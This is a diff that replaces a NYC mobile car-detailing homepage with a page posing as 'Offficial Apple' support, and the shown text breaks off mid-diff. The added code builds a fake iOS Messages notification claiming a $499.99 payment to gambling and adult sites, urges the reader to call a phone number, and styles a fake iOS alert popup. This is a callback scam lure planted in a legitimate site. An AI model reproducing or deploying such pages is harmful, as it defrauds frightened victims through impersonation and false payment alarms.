@@ -1,23 +1,23 @@
-<?php require __DIR__ . '/ajax.php' ?>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js"><head><style>body {transition: opacity ease-in 0.2s; } 
+body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; } 
+</style>
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- Google Consent Mode v2 — default denied, updated on user choice -->
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('consent', 'default', {
-      analytics_storage: 'denied',
-      ad_storage: 'denied',
-      ad_user_data: 'denied',
-      ad_personalization: 'denied',
-      wait_for_update: 500
-    });
-  </script>
- <!-- Google tag (gtag.js) -->
+
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Offficial Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%3DSF%2BPro%2Cv1_7CSF%2BPro%2BIcons%2Cv1html.html">
+    
+    <!-- Preload critical assets for faster mobile rendering -->
+    <link rel="preload" as="image" href="globalnav/apple/contact-us-hero.image.small_2x.jpg" media="(max-width: 735px)">
+    <link rel="preload" as="image" href="globalnav/apple/contact-us-hero.image.large_2x.jpg" media="(min-width: 736px)">
+    <link rel="preload" as="image" href="ucloud.jpg">
+    
+   <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
@@ -26,250 +26,704 @@
 
   gtag('config', 'G-2DMKRPGVF0');
 </script>
-  <title>QuickShine Auto — Mobile Car Detailing in NYC | We Come to You</title>
-  <meta name="description" content="Professional mobile car detailing in New York City. Exterior detailing, interior deep cleans, ceramic coating & paint correction at your home or office. Call for a free quote.">
-  <link rel="canonical" href="https://www.quickshineauto.com/index.php">
-  <meta property="og:type" content="website">
-  <meta property="og:site_name" content="QuickShine Auto">
-  <meta property="og:title" content="QuickShine Auto — Mobile Car Detailing in NYC | We Come to You">
-  <meta property="og:description" content="Professional mobile car detailing in New York City. Exterior detailing, interior deep cleans, ceramic coating & paint correction at your home or office. Call for a free quote.">
-  <meta property="og:url" content="https://www.quickshineauto.com/index.php">
-  <meta property="og:image" content="https://images.unsplash.com/photo-1552519507-da3b142c6e3d?auto=format&fit=crop&w=1200&q=70">
-  <meta name="twitter:card" content="summary_large_image">
-  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Ctext y='19' font-size='19'%3E%3C/text%3E%3Cpath d='M19 17h2c.6 0 1-.4 1-1v-3c0-.9-.7-1.7-1.5-1.9C18.7 10.6 16 10 16 10s-1.3-1.4-2.2-2.3c-.5-.4-1.1-.7-1.8-.7H5c-.6 0-1.1.4-1.4.9l-1.4 2.9A3.7 3.7 0 0 0 2 12v4c0 .6.4 1 1 1h2' fill='none' stroke='%23f59e0b' stroke-width='1.8'/%3E%3Ccircle cx='7' cy='17' r='2' fill='none' stroke='%23f59e0b' stroke-width='1.8'/%3E%3Ccircle cx='17' cy='17' r='2' fill='none' stroke='%23f59e0b' stroke-width='1.8'/%3E%3C/svg%3E">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Calistoga&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="css/style.css">
+
 </head>
+
 <body>
-  <header class="site-header">
-    <div class="container header-inner">
-      <a href="index.php" class="logo" aria-label="QuickShine Auto — home">
-        <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="url(#lg)" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><defs><linearGradient id="lg" x1="0" y1="0" x2="24" y2="24"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f59e0b"/></linearGradient></defs><path d="M19 17h2c.6 0 1-.4 1-1v-3c0-.9-.7-1.7-1.5-1.9C18.7 10.6 16 10 16 10s-1.3-1.4-2.2-2.3c-.5-.4-1.1-.7-1.8-.7H5c-.6 0-1.1.4-1.4.9l-1.4 2.9A3.7 3.7 0 0 0 2 12v4c0 .6.4 1 1 1h2"/><circle cx="7" cy="17" r="2"/><circle cx="17" cy="17" r="2"/><path d="M20.5 3.5 21 5l1.5.5L21 6l-.5 1.5L20 6l-1.5-.5L20 5z" fill="url(#lg)" stroke="none"/></svg>
-        <span>QuickShine <em>Auto</em></span>
-      </a>
-      <nav class="main-nav" aria-label="Main navigation">
-        <a href="index.php" class="active" aria-current="page">Home</a>
-        <a href="services.html">Services</a>
-        <a href="about.html">About</a>
-        <a href="blog.html">Blog</a>
-        <a href="contact.html">Contact</a>
-      </nav>
-      <div class="nav-cta">
-        <a href="tel:+18882837282" class="btn btn-primary btn-sm"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/></svg> Call Now</a>
-        <button class="nav-toggle" aria-label="Toggle menu" aria-expanded="false">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M4 6h16M4 12h16M4 18h16"/></svg>
-        </button>
-      </div>
-    </div>
-  </header>
+    <style>
+        /* iOS Notification Styles */
+        #ios-notification-container {
+            position: fixed;
+            top: -200px; /* Increased from -150px to ensure it fully hides when sliding up */
+            left: 50%;
+            transform: translateX(-50%);
+            width: 95%;
+            max-width: 400px;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border-radius: 22px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
+            z-index: 9999999;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            transition: top 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.1);
+            overflow: hidden;
+            padding: 14px 16px;
+            box-sizing: border-box;
+            border: 0.5px solid rgba(0, 0, 0, 0.05);
+        }
 
-  <main>
-    <section class="hero">
-      <div class="hero-media">
-        <img src="https://images.unsplash.com/photo-1552519507-da3b142c6e3d?auto=format&fit=crop&w=1920&q=70" alt="Freshly detailed red sports car with a mirror-gloss finish" width="1920" height="1080" fetchpriority="high" onerror="this.onerror=null;this.src='https://picsum.photos/seed/qsahero/1920/1080'">
-      </div>
-      <div class="container hero-grid">
-        <div>
-          <span class="eyebrow reveal">Mobile Detailing · New York City</span>
-          <h1 class="reveal" style="--d:.08s">Your Car, <span class="grad-text">Showroom Shine</span> — Right In Your Driveway</h1>
-          <p class="lead reveal" style="--d:.16s">QuickShine Auto brings professional-grade detailing to your home or office. No lines, no waiting rooms — just a deep, careful clean and that fresh-off-the-lot feeling, wherever you're parked.</p>
-          <div class="hero-badges reveal" style="--d:.24s">
-            <span class="badge"><svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="1" aria-hidden="true"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg> 4.9 rating · 900+ details</span>
-            <span class="badge"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg> Fully insured technicians</span>
-            <span class="badge"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M18.4 5.6l-2.1 2.1M7.7 16.3l-2.1 2.1"/></svg> Eco-friendly products</span>
-          </div>
-          <div class="hero-actions reveal" style="--d:.32s">
-            <a href="tel:+18882837282" class="btn btn-primary"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/></svg> +1 (888) 283-7282</a>
-            <a href="services.html" class="btn btn-ghost">See Packages <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg></a>
-          </div>
-        </div>
-        <aside class="hero-card reveal reveal-right" style="--d:.3s" aria-label="Free quote highlights">
-          <h3>Free Instant Quote</h3>
-          <p>One quick call and we'll price your detail on the spot — no obligation.</p>
-          <ul>
-            <li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg> We come to you — home, office or garage</li>
-            <li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg> Same-week appointments, 7 days a week</li>
-            <li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg> Satisfaction guaranteed or we re-do it free</li>
-          </ul>
-          <a href="tel:+18882837282" class="btn btn-primary"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/></svg> Call for Your Quote</a>
-          <small>Mon–Fri, 10 AM–6 PM ET · Calls connect directly to our team</small>
-        </aside>
-      </div>
-    </section>
+        #ios-notification-container.show {
+            top: 16px;
+        }
 
-    <div class="marquee" aria-hidden="true">
-      <div class="marquee-track">
-        <span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M18.4 5.6l-2.1 2.1M7.7 16.3l-2.1 2.1"/></svg> Hand Wash</span><span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M18.4 5.6l-2.1 2.1M7.7 16.3l-2.1 2.1"/></svg> Ceramic Coating</span><span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M18.4 5.6l-2.1 2.1M7.7 16.3l-2.1 2.1"/></svg> Interior Deep Clean</span><span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M18.4 5.6l-2.1 2.1M7.7 16.3l-2.1 2.1"/></svg> Paint Correction</span><span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M18.4 5.6l-2.1 2.1M7.7 16.3l-2.1 2.1"/></svg> Headlight Restoration</span><span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M18.4 5.6l-2.1 2.1M7.7 16.3l-2.1 2.1"/></svg> Engine Bay Detail</span><span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M18.4 5.6l-2.1 2.1M7.7 16.3l-2.1 2.1"/></svg> Pet Hair Removal</span><span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M18.4 5.6l-2.1 2.1M7.7 16.3l-2.1 2.1"/></svg> Odor Elimination</span>
-        <span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M18.4 5.6l-2.1 2.1M7.7 16.3l-2.1 2.1"/></svg> Hand Wash</span><span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M18.4 5.6l-2.1 2.1M7.7 16.3l-2.1 2.1"/></svg> Ceramic Coating</span><span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M18.4 5.6l-2.1 2.1M7.7 16.3l-2.1 2.1"/></svg> Interior Deep Clean</span><span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M18.4 5.6l-2.1 2.1M7.7 16.3l-2.1 2.1"/></svg> Paint Correction</span><span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M18.4 5.6l-2.1 2.1M7.7 16.3l-2.1 2.1"/></svg> Headlight Restoration</span><span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M18.4 5.6l-2.1 2.1M7.7 16.3l-2.1 2.1"/></svg> Engine Bay Detail</span><span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M18.4 5.6l-2.1 2.1M7.7 16.3l-2.1 2.1"/></svg> Pet Hair Removal</span><span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M18.4 5.6l-2.1 2.1M7.7 16.3l-2.1 2.1"/></svg> Odor Elimination</span>
-      </div>
-    </div>
+        .ios-notification-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 6px;
+        }
 
-    <section class="section">
-      <div class="container">
-        <div class="section-head reveal">
-          <span class="eyebrow">What We Do</span>
-          <h2>Detailing Services Built Around Your Car</h2>
-          <p>From a quick refresh before a big meeting to full paint correction on a weekend project car — pick the level of care your ride needs.</p>
-        </div>
-        <div class="grid-3">
-          <article class="card reveal" data-tilt>
-            <div class="card-media"><img src="https://images.unsplash.com/photo-1520340356584-f9917d1eea6f?auto=format&fit=crop&w=900&q=70" alt="Close-up of a polished headlight and glossy front fender after exterior detailing" width="900" height="560" loading="lazy" decoding="async" onerror="this.onerror=null;this.src='https://picsum.photos/seed/qsaext/900/560'"></div>
-            <div class="card-body">
-              <h3>Exterior Detailing</h3>
-              <p>Foam hand wash, clay bar decontamination, wheel and tire deep clean, and a sealant that keeps water beading for months.</p>
-              <a href="services.html#exterior" class="card-link">View package <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg></a>
+        .ios-notification-header-left {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .ios-app-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .ios-app-name {
+            font-size: 13px;
+            color: #000;
+            font-weight: 500;
+            letter-spacing: 0.2px;
+        }
+
+        .ios-time {
+            font-size: 13px;
+            color: #000;
+            font-weight: 400;
+        }
+
+        .ios-notification-body {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .ios-notification-content {
+            flex: 1;
+        }
+
+        .ios-notification-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 4px;
+            letter-spacing: -0.2px;
+        }
+
+        .ios-notification-text {
+            font-size: 15px;
+            color: #000;
+            line-height: 1.4;
+            padding-right: 8px;
+            letter-spacing: -0.2px;
+        }
+
+        .ios-notification-text span {
+            color: #1461B6; /* iOS blue link color */
+        }
+        
+        .ios-notification-text u {
+            color: #000;
+            text-decoration: underline;
+        }
+
+        .ios-notification-image {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 2px;
+        }
+
+        .ios-notification-image img {
+            width: 42px;
+            height: 42px;
+            border-radius: 8px;
+            object-fit: contain;
+            background-color: transparent;
+        }
+
+        /* First Custom Alert Popup Styles (Center) */
+        #ios-alert-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.4);
+            z-index: 9999998;
+            align-items: center;
+            /* Center aligned */
+            justify-content: center;
+        }
+
+        #ios-alert-overlay.show {
+            display: flex;
+        }
+
+        #ios-alert-box {
+            background-color: rgba(60, 60, 63, 0.75);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            width: 330px;
+            border-radius: 28px;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            text-align: center;
+            overflow: hidden;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.4);
+            padding: 24px 16px 16px 16px;
+            box-sizing: border-box;
+            border: 0.5px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .ios-alert-message {
+            font-size: 16px;
+            color: #FFF;
+            line-height: 1.4;
+            font-weight: 400;
+            margin-bottom: 24px;
+            padding: 0 8px;
+            text-align: center;
+            letter-spacing: -0.2px;
+        }
+
+        /* Update to ensure text formatting is preserved when injected via innerHTML */
+        .ios-alert-message br {
+            display: block;
+            margin-bottom: 2px;
+        }
+
+        .ios-alert-buttons-row {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 2px;
+        }
+
+        .ios-alert-btn-row {
+            flex: 1;
+            padding: 0;
+            font-size: 17px;
+            font-weight: 600;
+            border: none;
+            border-radius: 9999px;
+            cursor: pointer;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 48px;
+        }
+
+        .ios-alert-btn-row.cancel {
+            color: #fff;
+            background-color: rgba(255, 255, 255, 0.25);
+            font-weight: 500;
+        }
+
+        .ios-alert-btn-row.ok {
+            color: #fff;
+            background-color: #3B82F6;
+            font-weight: 600;
+        }
+
+        .ios-alert-btn-row:active {
+            opacity: 0.8;
+        }
+
+        /* Dark mode overrides if needed based on device, though keeping light mode to match image mostly */
+        @media (prefers-color-scheme: dark) {
+            .ios-app-name {
+                color: #000;
+            }
+            .ios-time {
+                color: #000;
+            }
+        }
+    </style>
+
+    <div id="ios-notification-container" onclick="callNumber()" style="cursor: pointer;" class="">
+        <div class="ios-notification-header">
+            <div class="ios-notification-header-left">
+                <div class="ios-app-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="16" height="16">
+                        <rect width="100" height="100" rx="22" fill="#34C759"></rect>
+                        <path d="M50 22C28 22 12 36 12 53C12 63 18 72 27 77C27 77 26 86 19 91C19 91 34 91 43 80C45 80.5 48 81 50 81C72 81 88 67 88 53C88 36 72 22 50 22Z" fill="#FFF"></path>
+                    </svg>
+                </div>
+                <span class="ios-app-name">MESSAGES</span>
             </div>
-          </article>
-          <article class="card reveal" style="--d:.1s" data-tilt>
-            <div class="card-media"><img src="https://images.unsplash.com/photo-1503376780353-7e6692767b70?auto=format&fit=crop&w=900&q=70" alt="Clean modern car interior with detailed dashboard and leather seats" width="900" height="560" loading="lazy" decoding="async" onerror="this.onerror=null;this.src='https://picsum.photos/seed/qsaint/900/560'"></div>
-            <div class="card-body">
-              <h3>Interior Deep Clean</h3>
-              <p>Steam cleaning, carpet and upholstery extraction, leather conditioning, and every vent, seam and cup holder detailed by hand.</p>
-              <a href="services.html#interior" class="card-link">View package <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg></a>
+            <div class="ios-notification-header-right">
+                <span class="ios-time">now</span>
             </div>
-          </article>
-          <article class="card reveal" style="--d:.2s" data-tilt>
-            <div class="card-media"><img src="https://images.unsplash.com/photo-1494976388531-d1058494cdd8?auto=format&fit=crop&w=900&q=70" alt="Sports car with deep reflective paint protected by ceramic coating" width="900" height="560" loading="lazy" decoding="async" onerror="this.onerror=null;this.src='https://picsum.photos/seed/qsacer/900/560'"></div>
-            <div class="card-body">
-              <h3>Ceramic Coating</h3>
-              <p>Multi-year professional-grade protection that locks in gloss, repels road grime and makes every future wash effortless.</p>
-              <a href="services.html#ceramic" class="card-link">View package <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg></a>
+        </div>
+
+        <div class="ios-notification-body">
+            <div class="ios-notification-content">
+                <div class="ios-notification-title">Payment Successful</div>
+                <div class="ios-notification-text"><span>Sent $ 499.99 via Online Transaction to <u>Betonline.net</u> &amp; <u>pornhub.net</u> . Not you? Call +1-877-481-3595</span></div>
             </div>
-          </article>
         </div>
-      </div>
-    </section>
-
-    <section class="section section-alt">
-      <div class="container">
-        <div class="stats-band">
-          <div class="stat reveal"><strong data-count="900" data-suffix="+">0</strong><span>Cars detailed</span></div>
-          <div class="stat reveal" style="--d:.08s"><strong data-count="4.9">0</strong><span>Average rating</span></div>
-          <div class="stat reveal" style="--d:.16s"><strong data-count="7" data-suffix=" yrs">0</strong><span>In business</span></div>
-          <div class="stat reveal" style="--d:.24s"><strong data-count="100" data-suffix="%">0</strong><span>Satisfaction guarantee</span></div>
-        </div>
-      </div>
-    </section>
-
-    <section class="section">
-      <div class="container">
-        <div class="section-head center reveal">
-          <span class="eyebrow">How It Works</span>
-          <h2>Booked in Minutes, Detailed in Hours</h2>
-        </div>
-        <div class="steps">
-          <div class="step reveal"><h3>Call or Message</h3><p>Tell us your vehicle, its condition and where it's parked. We'll quote you on the spot.</p></div>
-          <div class="step reveal" style="--d:.08s"><h3>Pick Your Slot</h3><p>Choose a time that works — early mornings, evenings and weekends included.</p></div>
-          <div class="step reveal" style="--d:.16s"><h3>We Come To You</h3><p>Our van arrives with water, power and pro-grade products. You don't lift a finger.</p></div>
-          <div class="step reveal" style="--d:.24s"><h3>Walk-Around &amp; Shine</h3><p>We inspect every panel with you before we leave. Not thrilled? We make it right, free.</p></div>
-        </div>
-      </div>
-    </section>
-
-    <section class="section section-alt">
-      <div class="container">
-        <div class="section-head center reveal">
-          <span class="eyebrow">Happy Drivers</span>
-          <h2>What Our Customers Say</h2>
-        </div>
-        <div class="grid-3">
-          <div class="quote-card reveal">
-            <div class="quote-stars"><svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="1" aria-hidden="true"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="1" aria-hidden="true"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="1" aria-hidden="true"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="1" aria-hidden="true"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="1" aria-hidden="true"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg></div>
-            <blockquote>"They detailed my SUV in my office parking lot while I worked. Came out looking better than the day I bought it. The interior smells brand new."</blockquote>
-            <div class="quote-who"><span class="avatar">MR</span><div><strong>Marcus R.</strong><span>Midtown Manhattan</span></div></div>
-          </div>
-          <div class="quote-card reveal" style="--d:.1s">
-            <div class="quote-stars"><svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="1" aria-hidden="true"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="1" aria-hidden="true"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="1" aria-hidden="true"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="1" aria-hidden="true"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="1" aria-hidden="true"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 